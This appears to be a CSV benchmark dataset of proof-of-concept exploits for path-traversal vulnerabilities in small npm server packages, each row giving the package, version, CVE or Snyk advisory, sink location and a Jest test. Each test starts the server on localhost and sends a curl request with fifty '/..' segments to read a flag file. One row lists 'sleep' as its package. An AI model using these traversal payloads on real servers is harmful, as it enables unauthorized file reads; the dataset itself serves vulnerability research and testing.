Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
path-traversal,,zs123,1.0.0,n/a,path-traversal/zs123_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zs123"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zs123/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:13:8,https://security.snyk.io/vuln/npm:zs123:20180315; 
path-traversal,,sabu,1.0.6,n/a,path-traversal/sabu_1.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in sabu"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/sabu/bin/sabu"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,utils.js:52:12,https://security.snyk.io/vuln/npm:sabu:20180226; 
path-traversal,,wuzhuang,1.0.0,n/a,path-traversal/wuzhuang_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wuzhuang"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wuzhuang/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:12:8,https://security.snyk.io/vuln/npm:wuzhuang:20180226; 
path-traversal,,serverlyj333,1.1.0,n/a,path-traversal/serverlyj333_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverlyj333"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverlyj333/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",n/a,index.js:9:8,https://security.snyk.io/vuln/npm:serverlyj333:20180315; 
path-traversal,,node-cxc,1.0.0,n/a,path-traversal/node-cxc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 80/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-cxc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 80/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/node-cxc/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:80${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,app.js:24:8,https://security.snyk.io/vuln/npm:node-cxc:20180226; 
path-traversal,CVE-2017-16215,sgqserve,1.0.0,n/a,path-traversal/sgqserve_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in sgqserve"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/sgqserve/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:22:8,https://security.snyk.io/vuln/npm:sgqserve:20170518; https://github.com/advisories/GHSA-m8pw-hgvj-cwcm
path-traversal,,zxyserver,1.0.0,n/a,path-traversal/zxyserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zxyserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zxyserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:10:9,https://security.snyk.io/vuln/npm:zxyserver:20180306; 
path-traversal,,simple-mock-server,0.2.1,n/a,path-traversal/simple-mock-server_0.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in simple-mock-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/simple-mock-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/simple-mock-server.js:62:31,https://security.snyk.io/vuln/npm:simple-mock-server:20180226; 
path-traversal,CVE-2017-16178,intsol-package,1.0.0,n/a,path-traversal/intsol-package_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in intsol-package"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/intsol-package/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:35:41,https://security.snyk.io/vuln/npm:intsol-package:20170511; https://github.com/advisories/GHSA-23wc-v4mf-x7v4
path-traversal,,sleep,^6.3.0,n/a,path-traversal/aso-server_0.4.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in aso-server"", (done) => {
  expect.assertions(1);
  var pkg = require('aso-server')
  const fs = require(""fs"");
  const { sleep } = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = pkg
     .onError(e => console.log(e))
     .onStop(() => {})
     .start('localhost', 3000, srv => {});
  sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000/f/${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});",n/a,,https://security.snyk.io/vuln/npm:aso-server:20180226; 
path-traversal,CVE-2017-16162,22lixian,1.0.0,n/a,path-traversal/22lixian_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in 22lixian"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/22lixian/demo.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,demo.js:6:8,https://security.snyk.io/vuln/npm:22lixian:20170511; https://github.com/advisories/GHSA-rrfc-g2gh-xvjm
path-traversal,CVE-2017-16217,fbr-client,1.0.3,n/a,path-traversal/fbr-client_1.0.3,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fbr-client"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fbr-client/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:53:12,https://security.snyk.io/vuln/npm:fbr-client:20170510; https://github.com/advisories/GHSA-qmhf-qg6f-pc4v
path-traversal,,serverzyqzyq,1.1.0,n/a,path-traversal/serverzyqzyq_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverzyqzyq"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverzyqzyq/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serverzyqzyq:20180315; 
path-traversal,CVE-2020-7683,rollup-plugin-server,0.7.0,n/a,path-traversal/rollup-plugin-server_0.7.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rollup-plugin-server"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  server({
    host: ""localhost"",
    port: 9000,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,dist/index.cjs.js:111:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVER-590123; https://github.com/advisories/GHSA-34gh-3cwv-wvp2
path-traversal,CVE-2020-7687,fast-http,0.1.3,n/a,path-traversal/fast-http_0.1.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fast-http"", (done) => {
  expect.assertions(1);
  const Server = require(""fast-http"");
  const fs = require(""fs"");
  const { exec, execSync } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let srv = new Server(8080, ""./"", true);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:35:16,https://security.snyk.io/vuln/SNYK-JS-FASTHTTP-572892; https://github.com/advisories/GHSA-7phr-5m9x-rw9q
